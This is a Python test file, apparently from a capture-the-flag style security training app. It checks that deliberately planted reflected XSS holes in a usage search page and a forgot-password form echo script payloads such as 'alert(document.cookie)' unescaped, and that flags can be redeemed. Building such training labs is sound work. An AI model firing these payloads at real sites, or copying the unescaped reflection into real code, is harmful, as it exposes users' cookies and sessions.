def test_rxss_teach_cookie_and_unescaped_reflection(alice, base_url, redeem_flag_fn):
    # The flag rides on a cookie set at login (see auth.py) -- confirm
    # it's there and genuinely redeemable...
    flag = alice.cookies.get("flag_reflected_xss")
    assert flag
    assert redeem_flag_fn(alice, base_url, flag)

    # ...and confirm the actual vulnerability: the query param comes back
    # on the page unescaped, not HTML-entity-encoded.
    payload = "<script>alert(document.cookie)</script>"
    resp = alice.get(f"{base_url}/usage", params={"q": payload}, timeout=10)
    assert payload in resp.text  # unescaped -- would be &lt;script&gt;... if it weren't


def test_rxss_exercise_forgot_password_title(anon_session, alice, base_url, extract_flag_fn, redeem_flag_fn):
    payload = "<script>alert(document.title)</script>@test.com"
    resp = anon_session.post(f"{base_url}/forgot-password", data={"email": payload}, timeout=10)
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(alice, base_url, flag)
